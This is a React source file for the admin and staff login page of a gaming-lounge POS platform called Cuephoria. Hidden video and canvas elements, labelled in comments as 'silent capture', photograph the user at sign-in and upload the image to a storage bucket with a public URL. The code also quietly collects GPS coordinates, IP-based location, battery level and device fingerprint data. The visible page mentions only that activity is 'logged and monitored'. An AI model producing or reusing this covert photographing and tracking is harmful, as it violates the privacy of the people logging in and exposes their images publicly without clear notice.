import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import { Shield, Users, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";

interface LocationState {
  from?: string;
}

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const { login } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  
  const [showPassword, setShowPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  
  // Hidden webcam and canvas for silent capture
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});

  // Silently initialize camera in background
  useEffect(() => {
    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
          setCameraReady(true);
          console.log('📷 Camera initialized silently');
        }
      } catch (error) {
        console.log('⚠️ Camera not available or permission denied');
        setCameraReady(false);
      }
    };
    
    initCamera();

    // Cleanup camera on unmount
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Silently capture photo
  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      console.log('⚠️ Camera not ready for capture');
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        console.log('📸 Selfie captured silently');
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('❌ Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      console.log('✅ Selfie uploaded successfully');
      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('❌ Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  // Collect all metadata - IMPROVED VERSION
  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          deviceModel: device.device.model || 'Unknown',
          deviceVendor: device.device.vendor || 'Unknown',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          touchSupport: 'ontouchstart' in window
        };

        // Hardware info
        if ('hardwareConcurrency' in navigator) {
          metadata.cpuCores = (navigator as any).hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
          metadata.deviceMemory = (navigator as any).deviceMemory;
        }

        // Connection info
        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
          metadata.connectionType = connection.effectiveType || connection.type;
        }

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery: any = await (navigator as any).getBattery();
            metadata.batteryLevel = Math.round(battery.level * 100);
          } catch (e) {
            console.log('⚠️ Battery API not available');
          }
        }

        // Get IP and location - Wait for response
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
          
          const response = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.region = data.region;
            metadata.country = data.country_name;
            metadata.timezone = data.timezone;
            metadata.isp = data.org;
            console.log('✅ IP and location data fetched successfully');
          }
        } catch (error) {
          console.log('⚠️ Could not fetch IP data, trying alternative...');
          
          // Try alternative API
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
              const data = await response.json();
              metadata.ip = data.ip;
              console.log('✅ IP fetched from alternative API');
            }
          } catch (e) {
            console.log('⚠️ All IP APIs failed');
          }
        }

        // Set initial metadata
        setLoginMetadata(metadata);

        // Get GPS coordinates silently - This runs separately
        if ('geolocation' in navigator) {
          console.log('📍 Requesting GPS location...');
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
              const updatedMetadata = {
                ...metadata,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                locationAccuracy: position.coords.accuracy
              };
              setLoginMetadata(updatedMetadata);
            },
            (error) => {
              console.log('⚠️ GPS location denied or unavailable:', error.message);
              // Keep existing metadata without GPS
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('⚠️ Geolocation not supported');
        }

        console.log('🔍 Login tracking ready - metadata collection initiated');
      } catch (error) {
        console.error('❌ Error collecting metadata:', error);
        // Set minimal metadata even if collection fails
        setLoginMetadata({
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent
        });
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: 'Error',
        description: 'Please enter both username and password',
        variant: 'destructive',
      });
      return;
    }
    
    setIsLoading(true);
    
    // Wait a moment for GPS to finish if it's still loading
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      // Silently capture selfie
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };

      console.log('🚀 Submitting login with metadata:', {
        hasIP: !!enhancedMetadata.ip,
        hasGPS: !!enhancedMetadata.latitude,
        hasSelfie: !!selfieUrl,
        city: enhancedMetadata.city,
        country: enhancedMetadata.country
      });
      
      const success = await login(username, password, isAdminLogin, enhancedMetadata);
      
      if (success) {
        // Stop camera after successful login
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        toast({
          title: 'Success',
          description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
        });
        
        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else {
        toast({
          title: 'Error',
          description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);
  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
  // Password reset / PIN-based log access removed (server-side auth now enforced).

  return (
    <div className="min-h-screen flex bg-[#080810] overflow-hidden">
      {/* Hidden video and canvas for silent capture */}
      <video ref={videoRef} style={{ display: 'none' }} autoPlay playsInline muted />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* ── LEFT BRANDING PANEL (desktop only) ── */}
      <div className="hidden lg:flex lg:w-[55%] xl:w-3/5 relative flex-col justify-between p-12 overflow-hidden">
        {/* layered background */}
        <div className="absolute inset-0 bg-gradient-to-br from-[#1a0a3a] via-[#0d0620] to-[#080810]" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_20%_50%,rgba(139,92,246,0.25)_0%,transparent_65%)]" />
        <div className="absolute bottom-0 right-0 w-[500px] h-[500px] bg-indigo-600/10 rounded-full blur-3xl" />
        {/* grid */}
        <div
          className="absolute inset-0 opacity-[0.03]"
          style={{
            backgroundImage:
              'linear-gradient(rgba(255,255,255,0.15) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.15) 1px, transparent 1px)',
            backgroundSize: '60px 60px',
          }}
        />

        {/* logo */}
        <div className="relative z-10">
          <div className="flex items-center gap-3">
            <img
              src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png"
              alt="Cuephoria"
              className="h-11 w-auto drop-shadow-[0_0_16px_rgba(139,92,246,0.5)]"
            />
            <span className="text-white font-extrabold text-xl tracking-tight">Cuephoria</span>
          </div>
          <p className="mt-1 text-[11px] tracking-[0.2em] uppercase text-purple-400 font-medium pl-1">
            POS &amp; Management Platform
          </p>
        </div>

        {/* headline */}
        <div className="relative z-10 max-w-md">
          <h1 className="text-[3.2rem] font-extrabold text-white leading-[1.1] mb-5 tracking-tight">
            Manage your<br />
            <span className="bg-gradient-to-r from-purple-400 via-pink-400 to-blue-400 bg-clip-text text-transparent">
              gaming empire
            </span><br />
            from one place.
          </h1>
          <p className="text-gray-400 text-base leading-relaxed mb-8">
            Full-stack POS, booking management, staff tracking, and live analytics — purpose-built for gaming lounges.
          </p>

          <div className="grid grid-cols-2 gap-3">
            {[
              { label: 'Live Station Tracking', icon: '🎮' },
              { label: 'Automated Bookings', icon: '📅' },
              { label: 'Staff &amp; Payroll', icon: '👥' },
              { label: 'Revenue Reports', icon: '📊' },
            ].map((item) => (
              <div
                key={item.label}
                className="flex items-center gap-3 bg-white/[0.04] border border-white/[0.08] rounded-xl px-4 py-3 backdrop-blur-sm"
              >
                <span className="text-lg">{item.icon}</span>
                <span className="text-gray-300 text-sm font-medium" dangerouslySetInnerHTML={{ __html: item.label }} />
              </div>
            ))}
          </div>
        </div>

        {/* trust badges */}
        <div className="relative z-10 flex items-center gap-6">
          <div className="flex items-center gap-1.5 text-gray-600 text-xs">
            <Shield size={13} className="text-purple-500" />
            <span>Login attempts are monitored</span>
          </div>
          <div className="flex items-center gap-1.5 text-gray-600 text-xs">
            <Lock size={13} className="text-purple-500" />
            <span>End-to-end encrypted</span>
          </div>
        </div>
      </div>

      {/* ── RIGHT LOGIN PANEL ── */}
      <div className="flex-1 flex flex-col justify-center px-6 sm:px-10 lg:px-14 xl:px-20 py-12 relative bg-[#0b0b16]/80 backdrop-blur-xl">
        {/* subtle glow behind form */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-700/10 rounded-full blur-3xl pointer-events-none" />

        {/* top nav */}
        <div className="absolute top-4 right-4 flex items-center gap-1">
          <Button
            variant="ghost"
            size="sm"
            className="text-gray-500 hover:text-white text-xs h-8 px-3 rounded-lg"
            onClick={() => navigate('/')}
          >
            <ArrowLeft size={13} className="mr-1" /> Back
          </Button>
          <Button
            variant="ghost"
            size="sm"
            className="text-gray-500 hover:text-white text-xs h-8 px-3 rounded-lg"
            onClick={() => navigate('/login-logs')}
          >
            <FileText size={13} className="mr-1" /> Logs
          </Button>
        </div>

        <div className="w-full max-w-[360px] mx-auto relative z-10">
          {/* Mobile logo */}
          <div className="lg:hidden flex items-center justify-center gap-3 mb-10">
            <img
              src="/lovable-uploads/edbcb263-8fde-45a9-b66b-02f664772425.png"
              alt="Cuephoria"
              className="h-14 w-auto drop-shadow-[0_0_20px_rgba(139,92,246,0.5)]"
            />
          </div>

          {/* heading */}
          <div className="mb-8">
            <h2 className="text-2xl font-bold text-white mb-1">Sign in</h2>
            <p className="text-gray-500 text-sm">Enter your credentials to access the control panel</p>
          </div>

          {/* Admin / Staff toggle */}
          <div className="flex bg-white/[0.04] border border-white/[0.08] rounded-xl p-1 mb-7">
            {(['admin', 'staff'] as const).map((type) => (
              <button
                key={type}
                type="button"
                onClick={() => setLoginType(type)}
                className={`flex-1 flex items-center justify-center gap-2 text-sm py-2.5 rounded-lg font-semibold transition-all duration-200 ${
                  loginType === type
                    ? 'bg-gradient-to-r from-purple-600 to-indigo-600 text-white shadow-lg shadow-purple-600/30'
                    : 'text-gray-500 hover:text-gray-300'
                }`}
              >
                {type === 'admin' ? <Shield size={14} /> : <Users size={14} />}
                {type === 'admin' ? 'Admin' : 'Staff'}
              </button>
            ))}
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <label className="block text-[13px] font-medium text-gray-400 mb-2">
                Username
              </label>
              <Input
                type="text"
                placeholder="your_username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-11 bg-white/[0.05] border-white/[0.09] text-white placeholder:text-gray-700 focus-visible:ring-1 focus-visible:ring-purple-500 focus-visible:border-purple-500 rounded-xl text-sm"
              />
            </div>

            <div>
              <label className="block text-[13px] font-medium text-gray-400 mb-2">
                Password
              </label>
              <div className="relative">
                <Input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="••••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-11 bg-white/[0.05] border-white/[0.09] text-white placeholder:text-gray-700 focus-visible:ring-1 focus-visible:ring-purple-500 focus-visible:border-purple-500 rounded-xl text-sm pr-11"
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-300 transition-colors"
                >
                  {showPassword ? <EyeOff size={17} /> : <Eye size={17} />}
                </button>
              </div>
            </div>

            <div className="flex justify-end -mt-2">
              <Button
                type="button"
                variant="link"
                className="text-purple-500 hover:text-purple-300 p-0 h-auto text-[13px]"
                onClick={() =>
                  toast({ title: 'Password Reset', description: 'Please contact your administrator for password assistance.' })
                }
              >
                Forgot password?
              </Button>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full h-11 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-semibold rounded-xl shadow-lg shadow-purple-600/20 transition-all duration-200 text-sm mt-1"
            >
              {isLoading ? (
                <span className="flex items-center gap-2">
                  <svg className="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  Authenticating…
                </span>
              ) : (
                <span className="flex items-center gap-2">
                  {loginType === 'admin' ? <Shield size={15} /> : <Users size={15} />}
                  {loginType === 'admin' ? 'Sign in as Admin' : 'Sign in as Staff'}
                </span>
              )}
            </Button>
          </form>

          {/* footer note */}
          <p className="mt-8 text-center text-[11px] text-gray-700 leading-relaxed">
            This portal is for authorised personnel only.<br />
            All activity is logged and monitored.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
